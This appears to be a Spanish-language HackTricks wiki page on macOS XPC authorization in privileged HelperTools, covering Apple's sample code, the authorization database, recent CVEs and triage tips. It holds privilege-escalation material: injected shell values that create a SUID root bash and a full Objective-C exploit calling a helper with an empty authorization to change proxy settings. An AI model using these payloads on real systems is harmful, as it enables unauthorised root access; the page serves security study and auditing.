# macOS XPC Autorización

{{#include ../../../../../banners/hacktricks-training.md}}

## Autorización XPC

Apple también propone otra forma de autenticar si el proceso que se conecta tiene **permisos para llamar a un método XPC expuesto**.

Cuando una aplicación necesita **ejecutar acciones como un usuario privilegiado**, en lugar de ejecutar la app como usuario privilegiado suele instalar como root un HelperTool como servicio XPC que puede ser llamado desde la app para realizar esas acciones. Sin embargo, la app que llama al servicio debe tener suficiente autorización.

### ShouldAcceptNewConnection siempre YES

Un ejemplo puede encontrarse en [EvenBetterAuthorizationSample](https://github.com/brenwell/EvenBetterAuthorizationSample). En `App/AppDelegate.m` intenta **conectarse** al **HelperTool**. Y en `HelperTool/HelperTool.m` la función **`shouldAcceptNewConnection`** **no verificará** ninguno de los requisitos indicados anteriormente. Siempre devolverá YES:
```objectivec
- (BOOL)listener:(NSXPCListener *)listener shouldAcceptNewConnection:(NSXPCConnection *)newConnection
// Called by our XPC listener when a new connection comes in.  We configure the connection
// with our protocol and ourselves as the main object.
{
assert(listener == self.listener);
#pragma unused(listener)
assert(newConnection != nil);

newConnection.exportedInterface = [NSXPCInterface interfaceWithProtocol:@protocol(HelperToolProtocol)];
newConnection.exportedObject = self;
[newConnection resume];

return YES;
}
```
Para más información sobre cómo configurar correctamente esta comprobación:


{{#ref}}
macos-xpc-connecting-process-check/
{{#endref}}

### Permisos de la aplicación

Sin embargo, hay cierta **autorización en juego cuando se llama a un método del HelperTool**.

La función **`applicationDidFinishLaunching`** de `App/AppDelegate.m` creará una referencia de autorización vacía después de que la aplicación se haya iniciado. Esto debería funcionar siempre.\
A continuación, intentará **añadir algunos permisos** a esa referencia de autorización llamando a `setupAuthorizationRights`:
```objectivec
- (void)applicationDidFinishLaunching:(NSNotification *)note
{
[...]
err = AuthorizationCreate(NULL, NULL, 0, &self->_authRef);
if (err == errAuthorizationSuccess) {
err = AuthorizationMakeExternalForm(self->_authRef, &extForm);
}
if (err == errAuthorizationSuccess) {
self.authorization = [[NSData alloc] initWithBytes:&extForm length:sizeof(extForm)];
}
assert(err == errAuthorizationSuccess);

// If we successfully connected to Authorization Services, add definitions for our default
// rights (unless they're already in the database).

if (self->_authRef) {
[Common setupAuthorizationRights:self->_authRef];
}

[self.window makeKeyAndOrderFront:self];
}
```
La función `setupAuthorizationRights` de `Common/Common.m` almacenará en la base de datos de autorización `/var/db/auth.db` los permisos de la aplicación. Fíjate en que solo añadirá los permisos que aún no están en la base de datos:
```objectivec
+ (void)setupAuthorizationRights:(AuthorizationRef)authRef
// See comment in header.
{
assert(authRef != NULL);
[Common enumerateRightsUsingBlock:^(NSString * authRightName, id authRightDefault, NSString * authRightDesc) {
OSStatus    blockErr;

// First get the right.  If we get back errAuthorizationDenied that means there's
// no current definition, so we add our default one.

blockErr = AuthorizationRightGet([authRightName UTF8String], NULL);
if (blockErr == errAuthorizationDenied) {
blockErr = AuthorizationRightSet(
authRef,                                    // authRef
[authRightName UTF8String],                 // rightName
(__bridge CFTypeRef) authRightDefault,      // rightDefinition
(__bridge CFStringRef) authRightDesc,       // descriptionKey
NULL,                                       // bundle (NULL implies main bundle)
CFSTR("Common")                             // localeTableName
);
assert(blockErr == errAuthorizationSuccess);
} else {
// A right already exists (err == noErr) or any other error occurs, we
// assume that it has been set up in advance by the system administrator or
// this is the second time we've run.  Either way, there's nothing more for
// us to do.
}
}];
}
```
La función `enumerateRightsUsingBlock` es la que se usa para obtener los permisos de las aplicaciones, que están definidos en `commandInfo`:
```objectivec
static NSString * kCommandKeyAuthRightName    = @"authRightName";
static NSString * kCommandKeyAuthRightDefault = @"authRightDefault";
static NSString * kCommandKeyAuthRightDesc    = @"authRightDescription";

+ (NSDictionary *)commandInfo
{
static dispatch_once_t sOnceToken;
static NSDictionary *  sCommandInfo;

dispatch_once(&sOnceToken, ^{
sCommandInfo = @{
NSStringFromSelector(@selector(readLicenseKeyAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.readLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to read its license key.",
@"prompt shown when user is required to authorize to read the license key"
)
},
NSStringFromSelector(@selector(writeLicenseKey:authorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.writeLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleAuthenticateAsAdmin,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to write its license key.",
@"prompt shown when user is required to authorize to write the license key"
)
},
NSStringFromSelector(@selector(bindToLowNumberPortAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.startWebService",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to start its web service.",
@"prompt shown when user is required to authorize to start the web service"
)
}
};
});
return sCommandInfo;
}

+ (NSString *)authorizationRightForCommand:(SEL)command
// See comment in header.
{
return [self commandInfo][NSStringFromSelector(command)][kCommandKeyAuthRightName];
}

+ (void)enumerateRightsUsingBlock:(void (^)(NSString * authRightName, id authRightDefault, NSString * authRightDesc))block
// Calls the supplied block with information about each known authorization right..
{
[self.commandInfo enumerateKeysAndObjectsUsingBlock:^(id key, id obj, BOOL *stop) {
#pragma unused(key)
#pragma unused(stop)
NSDictionary *  commandDict;
NSString *      authRightName;
id              authRightDefault;
NSString *      authRightDesc;

// If any of the following asserts fire it's likely that you've got a bug
// in sCommandInfo.

commandDict = (NSDictionary *) obj;
assert([commandDict isKindOfClass:[NSDictionary class]]);

authRightName = [commandDict objectForKey:kCommandKeyAuthRightName];
assert([authRightName isKindOfClass:[NSString class]]);

authRightDefault = [commandDict objectForKey:kCommandKeyAuthRightDefault];
assert(authRightDefault != nil);

authRightDesc = [commandDict objectForKey:kCommandKeyAuthRightDesc];
assert([authRightDesc isKindOfClass:[NSString class]]);

block(authRightName, authRightDefault, authRightDesc);
}];
}
```
Esto significa que al final de este proceso, los permisos declarados dentro de `commandInfo` se almacenarán en `/var/db/auth.db`. Fíjate en que allí puedes encontrar para **cada método** que **requerirá autenticación**, el **nombre del permiso** y el **`kCommandKeyAuthRightDefault`**. Este último **indica quién puede obtener este permiso**.

Hay diferentes ámbitos para indicar quién puede acceder a un permiso. Algunos de ellos están definidos en [AuthorizationDB.h](https://github.com/aosm/Security/blob/master/Security/libsecurity_authorization/lib/AuthorizationDB.h) (puedes encontrar [todos ellos aquí](https://www.dssw.co.uk/reference/authorization-rights/)), pero como resumen:

<table><thead><tr><th width="284.3333333333333">Nombre</th><th width="165">Valor</th><th>Descripción</th></tr></thead><tbody><tr><td>kAuthorizationRuleClassAllow</td><td>allow</td><td>Cualquiera</td></tr><tr><td>kAuthorizationRuleClassDeny</td><td>deny</td><td>Nadie</td></tr><tr><td>kAuthorizationRuleIsAdmin</td><td>is-admin</td><td>El usuario actual debe ser administrador (pertenecer al grupo admin)</td></tr><tr><td>kAuthorizationRuleAuthenticateAsSessionUser</td><td>authenticate-session-owner</td><td>Pedir al usuario que se autentique.</td></tr><tr><td>kAuthorizationRuleAuthenticateAsAdmin</td><td>authenticate-admin</td><td>Pedir al usuario que se autentique. Debe ser administrador (pertenecer al grupo admin)</td></tr><tr><td>kAuthorizationRightRule</td><td>rule</td><td>Especificar reglas</td></tr><tr><td>kAuthorizationComment</td><td>comment</td><td>Especificar algunos comentarios adicionales sobre el permiso</td></tr></tbody></table>

### Verificación de permisos

En `HelperTool/HelperTool.m` la función **`readLicenseKeyAuthorization`** comprueba si el llamador está autorizado para **ejecutar dicho método** llamando a la función **`checkAuthorization`**. Esta función comprobará que los **authData** enviados por el proceso llamante tienen un **formato correcto** y luego verificará **qué se necesita para obtener el permiso** para invocar el método específico. Si todo va bien, el **`error` devuelto será `nil`**:
```objectivec
- (NSError *)checkAuthorization:(NSData *)authData command:(SEL)command
{
[...]

// First check that authData looks reasonable.

error = nil;
if ( (authData == nil) || ([authData length] != sizeof(AuthorizationExternalForm)) ) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:paramErr userInfo:nil];
}

// Create an authorization ref from that the external form data contained within.

if (error == nil) {
err = AuthorizationCreateFromExternalForm([authData bytes], &authRef);

// Authorize the right associated with the command.

if (err == errAuthorizationSuccess) {
AuthorizationItem   oneRight = { NULL, 0, NULL, 0 };
AuthorizationRights rights   = { 1, &oneRight };

oneRight.name = [[Common authorizationRightForCommand:command] UTF8String];
assert(oneRight.name != NULL);

err = AuthorizationCopyRights(
authRef,
&rights,
NULL,
kAuthorizationFlagExtendRights | kAuthorizationFlagInteractionAllowed,
NULL
);
}
if (err != errAuthorizationSuccess) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:err userInfo:nil];
}
}

if (authRef != NULL) {
junk = AuthorizationFree(authRef, 0);
assert(junk == errAuthorizationSuccess);
}

return error;
}
```
Tenga en cuenta que para **verificar los requisitos para obtener el derecho** de invocar ese método la función `authorizationRightForCommand` solo comprobará el objeto mencionado anteriormente **`commandInfo`**. Luego, llamará a **`AuthorizationCopyRights`** para comprobar **si tiene los derechos** para invocar la función (nota: los flags permiten interacción con el usuario).

En este caso, para invocar la función `readLicenseKeyAuthorization` el `kCommandKeyAuthRightDefault` está definido como `@kAuthorizationRuleClassAllow`. Así que **cualquiera puede llamarla**.

### Información de la DB

Se mencionó que esta información se almacena en `/var/db/auth.db`. Puedes listar todas las reglas almacenadas con:
```sql
sudo sqlite3 /var/db/auth.db
SELECT name FROM rules;
SELECT name FROM rules WHERE name LIKE '%safari%';
```
Entonces, puedes leer quién puede acceder al derecho con:
```bash
security authorizationdb read com.apple.safaridriver.allow
```
### Permissive rights

Puedes encontrar **todas las configuraciones de permisos** [**aquí**](https://www.dssw.co.uk/reference/authorization-rights/), pero las combinaciones que no requerirían interacción del usuario serían:

1. **'authenticate-user': 'false'**
- Esta es la clave más directa. Si se establece en `false`, especifica que un usuario no necesita proporcionar autenticación para obtener este derecho.
- Se usa en **combinación con una de las 2 siguientes o indicando un grupo** al que el usuario debe pertenecer.
2. **'allow-root': 'true'**
- Si un usuario está operando como root user (que tiene permisos elevados), y esta clave está establecida en `true`, el root user podría potencialmente obtener este derecho sin más autenticación. Sin embargo, típicamente, llegar a un estado de root user ya requiere autenticación, por lo que esto no es un escenario de "sin autenticación" para la mayoría de los usuarios.
3. **'session-owner': 'true'**
- Si se establece en `true`, el propietario de la sesión (el usuario actualmente conectado) obtendría automáticamente este derecho. Esto podría evitar autenticaciones adicionales si el usuario ya ha iniciado sesión.
4. **'shared': 'true'**
- Esta clave no otorga derechos sin autenticación. En su lugar, si se establece en `true`, significa que una vez que el derecho ha sido autenticado, puede compartirse entre múltiples procesos sin que cada uno necesite volver a autenticarse. Pero la concesión inicial del derecho aún requeriría autenticación a menos que se combine con otras claves como `'authenticate-user': 'false'`.

Puedes [**usar este script**](https://gist.github.com/carlospolop/96ecb9e385a4667b9e40b24e878652f9) para obtener los derechos interesantes:
```bash
Rights with 'authenticate-user': 'false':
is-admin (admin), is-admin-nonshared (admin), is-appstore (_appstore), is-developer (_developer), is-lpadmin (_lpadmin), is-root (run as root), is-session-owner (session owner), is-webdeveloper (_webdeveloper), system-identity-write-self (session owner), system-install-iap-software (run as root), system-install-software-iap (run as root)

Rights with 'allow-root': 'true':
com-apple-aosnotification-findmymac-remove, com-apple-diskmanagement-reservekek, com-apple-openscripting-additions-send, com-apple-reportpanic-fixright, com-apple-servicemanagement-blesshelper, com-apple-xtype-fontmover-install, com-apple-xtype-fontmover-remove, com-apple-dt-instruments-process-analysis, com-apple-dt-instruments-process-kill, com-apple-pcastagentconfigd-wildcard, com-apple-trust-settings-admin, com-apple-wifivelocity, com-apple-wireless-diagnostics, is-root, system-install-iap-software, system-install-software, system-install-software-iap, system-preferences, system-preferences-accounts, system-preferences-datetime, system-preferences-energysaver, system-preferences-network, system-preferences-printing, system-preferences-security, system-preferences-sharing, system-preferences-softwareupdate, system-preferences-startupdisk, system-preferences-timemachine, system-print-operator, system-privilege-admin, system-services-networkextension-filtering, system-services-networkextension-vpn, system-services-systemconfiguration-network, system-sharepoints-wildcard

Rights with 'session-owner': 'true':
authenticate-session-owner, authenticate-session-owner-or-admin, authenticate-session-user, com-apple-safari-allow-apple-events-to-run-javascript, com-apple-safari-allow-javascript-in-smart-search-field, com-apple-safari-allow-unsigned-app-extensions, com-apple-safari-install-ephemeral-extensions, com-apple-safari-show-credit-card-numbers, com-apple-safari-show-passwords, com-apple-icloud-passwordreset, com-apple-icloud-passwordreset, is-session-owner, system-identity-write-self, use-login-window-ui
```
- **CVE-2025-65842 – Acustica Audio Aquarius HelperTool**: El privileged Mach service `com.acustica.HelperTool` acepta todas las conexiones y su rutina `checkAuthorization:` llama a `AuthorizationCopyRights(NULL, …)`, por lo que cualquier blob de 32‑bytes pasa. `executeCommand:authorization:withReply:` luego pasa strings separadas por comas controladas por el atacante a `NSTask` como root, generando payloads como:
```bash
"/bin/sh,-c,cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash"
```
Permite crear trivialmente un SUID root shell. Details in [this write-up](https://almightysec.com/helpertool-xpc-service-local-privilege-escalation/).
- **CVE-2025-55076 – Plugin Alliance InstallationHelper**: El listener siempre devuelve YES y el mismo patrón NULL `AuthorizationCopyRights` aparece en `checkAuthorization:`. El método `exchangeAppWithReply:` concatena input del atacante en una cadena para `system()` dos veces, por lo que inyectar metacaracteres de shell en `appPath` (p.ej. `"/Applications/Test.app";chmod 4755 /tmp/rootbash;`) produce ejecución de código como root vía el servicio Mach `com.plugin-alliance.pa-installationhelper`. More info [here](https://almightysec.com/Plugin-Alliance-HelperTool-XPC-Service-Local-Privilege-Escalation/).
- **CVE-2024-4395 – Jamf Compliance Editor helper**: Al ejecutar una auditoría deja `/Library/LaunchDaemons/com.jamf.complianceeditor.helper.plist`, expone el servicio Mach `com.jamf.complianceeditor.helper`, y exporta `-executeScriptAt:arguments:then:` sin verificar el `AuthorizationExternalForm` del caller ni la firma de código. Un exploit trivial hace `AuthorizationCreate` de una referencia vacía, se conecta con `[[NSXPCConnection alloc] initWithMachServiceName:options:NSXPCConnectionPrivileged]`, e invoca el método para ejecutar binarios arbitrarios como root. Full reversing notes (plus PoC) in [Mykola Grymalyuk’s write-up](https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html).
- **CVE-2025-25251 – FortiClient Mac helper**: FortiClient Mac 7.0.0–7.0.14, 7.2.0–7.2.8 and 7.4.0–7.4.2 aceptaron mensajes XPC crafted que alcanzaban a un helper privilegiado sin controles de autorización. Debido a que el helper confiaba en su propio privilegiado `AuthorizationRef`, cualquier usuario local capaz de enviar mensajes al servicio podía forzarlo a ejecutar cambios de configuración arbitrarios o comandos como root. Details in [SentinelOne’s advisory summary](https://www.sentinelone.com/vulnerability-database/cve-2025-25251/).

#### Consejos rápidos de triaje

- Cuando una app ships both a GUI and helper, diff their code requirements and check whether `shouldAcceptNewConnection` locks the listener with `-setCodeSigningRequirement:` (or validates `SecCodeCopySigningInformation`). Missing checks usually yield CWE-863 scenarios like the Jamf case. Una inspección rápida se ve así:
```bash
codesign --display --requirements - /Applications/Jamf\ Compliance\ Editor.app
```
- Compara lo que el helper *cree* que está autorizando con lo que provee el cliente. Al hacer reversing, pon un breakpoint en `AuthorizationCopyRights` y confirma que el `AuthorizationRef` se origina en `AuthorizationCreateFromExternalForm` (proporcionado por el cliente) en lugar del propio contexto privilegiado del helper; de lo contrario, probablemente hayas encontrado un patrón CWE-863 similar a los casos anteriores.

## Reversión de la autorización

### Comprobando si EvenBetterAuthorization es usado

Si encuentras la función: **`[HelperTool checkAuthorization:command:]`** probablemente el proceso esté usando el esquema de autorización mencionado anteriormente:

<figure><img src="../../../../../images/image (42).png" alt=""><figcaption></figcaption></figure>

Luego, si esta función llama a funciones como `AuthorizationCreateFromExternalForm`, `authorizationRightForCommand`, `AuthorizationCopyRights`, `AuhtorizationFree`, está usando [**EvenBetterAuthorizationSample**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L101-L154).

Revisa el **`/var/db/auth.db`** para ver si es posible obtener permisos para invocar alguna acción privilegiada sin interacción del usuario.

### Comunicación del protocolo

Después, necesitas encontrar el esquema del protocolo para poder establecer comunicación con el servicio XPC.

La función **`shouldAcceptNewConnection`** indica el protocolo que se está exportando:

<figure><img src="../../../../../images/image (44).png" alt=""><figcaption></figcaption></figure>

En este caso, tenemos lo mismo que en EvenBetterAuthorizationSample, [**revisa esta línea**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L94).

Conociendo el nombre del protocolo usado, es posible **volcar la definición de su header** con:
```bash
class-dump /Library/PrivilegedHelperTools/com.example.HelperTool

[...]
@protocol HelperToolProtocol
- (void)overrideProxySystemWithAuthorization:(NSData *)arg1 setting:(NSDictionary *)arg2 reply:(void (^)(NSError *))arg3;
- (void)revertProxySystemWithAuthorization:(NSData *)arg1 restore:(BOOL)arg2 reply:(void (^)(NSError *))arg3;
- (void)legacySetProxySystemPreferencesWithAuthorization:(NSData *)arg1 enabled:(BOOL)arg2 host:(NSString *)arg3 port:(NSString *)arg4 reply:(void (^)(NSError *, BOOL))arg5;
- (void)getVersionWithReply:(void (^)(NSString *))arg1;
- (void)connectWithEndpointReply:(void (^)(NSXPCListenerEndpoint *))arg1;
@end
[...]
```
Por último, solo necesitamos saber el **nombre del Mach Service expuesto** para establecer una comunicación con él. Hay varias formas de encontrarlo:

- En el **`[HelperTool init]`** donde puedes ver el Mach Service que se está utilizando:

<figure><img src="../../../../../images/image (41).png" alt=""><figcaption></figcaption></figure>

- En el launchd plist:
```xml
cat /Library/LaunchDaemons/com.example.HelperTool.plist

[...]

<key>MachServices</key>
<dict>
<key>com.example.HelperTool</key>
<true/>
</dict>
[...]
```
### Exploit Example

En este ejemplo se crea:

- La definición del protocol con sus functions
- Un auth vacío para usar al solicitar access
- Una connection al XPC service
- Una call a la function si la connection fue exitosa
```objectivec
// gcc -framework Foundation -framework Security expl.m -o expl

#import <Foundation/Foundation.h>
#import <Security/Security.h>

// Define a unique service name for the XPC helper
static NSString* XPCServiceName = @"com.example.XPCHelper";

// Define the protocol for the helper tool
@protocol XPCHelperProtocol
- (void)applyProxyConfigWithAuthorization:(NSData *)authData settings:(NSDictionary *)settings reply:(void (^)(NSError *))callback;
- (void)resetProxyConfigWithAuthorization:(NSData *)authData restoreDefault:(BOOL)shouldRestore reply:(void (^)(NSError *))callback;
- (void)legacyConfigureProxyWithAuthorization:(NSData *)authData enabled:(BOOL)isEnabled host:(NSString *)hostAddress port:(NSString *)portNumber reply:(void (^)(NSError *, BOOL))callback;
- (void)fetchVersionWithReply:(void (^)(NSString *))callback;
- (void)establishConnectionWithReply:(void (^)(NSXPCListenerEndpoint *))callback;
@end

int main(void) {
NSData *authData;
OSStatus status;
AuthorizationExternalForm authForm;
AuthorizationRef authReference = {0};
NSString *proxyAddress = @"127.0.0.1";
NSString *proxyPort = @"4444";
Boolean isProxyEnabled = true;

// Create an empty authorization reference
status = AuthorizationCreate(NULL, kAuthorizationEmptyEnvironment, kAuthorizationFlagDefaults, &authReference);
const char* errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);

// Convert the authorization reference to an external form
if (status == errAuthorizationSuccess) {
status = AuthorizationMakeExternalForm(authReference, &authForm);
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Convert the external form to NSData for transmission
if (status == errAuthorizationSuccess) {
authData = [[NSData alloc] initWithBytes:&authForm length:sizeof(authForm)];
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Ensure the authorization was successful
assert(status == errAuthorizationSuccess);

// Establish an XPC connection
NSString *serviceName = XPCServiceName;
NSXPCConnection *xpcConnection = [[NSXPCConnection alloc] initWithMachServiceName:serviceName options:0x1000];
NSXPCInterface *xpcInterface = [NSXPCInterface interfaceWithProtocol:@protocol(XPCHelperProtocol)];
[xpcConnection setRemoteObjectInterface:xpcInterface];
[xpcConnection resume];

// Handle errors for the XPC connection
id remoteProxy = [xpcConnection remoteObjectProxyWithErrorHandler:^(NSError *error) {
NSLog(@"[-] Connection error");
NSLog(@"[-] Error: %@", error);
}];

// Log the remote proxy and connection objects
NSLog(@"Remote Proxy: %@", remoteProxy);
NSLog(@"XPC Connection: %@", xpcConnection);

// Use the legacy method to configure the proxy
[remoteProxy legacyConfigureProxyWithAuthorization:authData enabled:isProxyEnabled host:proxyAddress port:proxyPort reply:^(NSError *error, BOOL success) {
NSLog(@"Response: %@", error);
}];

// Allow some time for the operation to complete
[NSThread sleepForTimeInterval:10.0f];

NSLog(@"Finished!");
}
```
## Otros helpers de privilegios de XPC abusados

- [https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared](https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared)

## Referencias

- [https://theevilbit.github.io/posts/secure_coding_xpc_part1/](https://theevilbit.github.io/posts/secure_coding_xpc_part1/)
- [https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html](https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html)
- [https://www.sentinelone.com/vulnerability-database/cve-2025-25251/](https://www.sentinelone.com/vulnerability-database/cve-2025-25251/)
- [https://almightysec.com/helpertool-xpc-service-local-privilege-escalation/](https://almightysec.com/helpertool-xpc-service-local-privilege-escalation/)
- [https://almightysec.com/Plugin-Alliance-HelperTool-XPC-Service-Local-Privilege-Escalation/](https://almightysec.com/Plugin-Alliance-HelperTool-XPC-Service-Local-Privilege-Escalation/)

{{#include ../../../../../banners/hacktricks-training.md}}
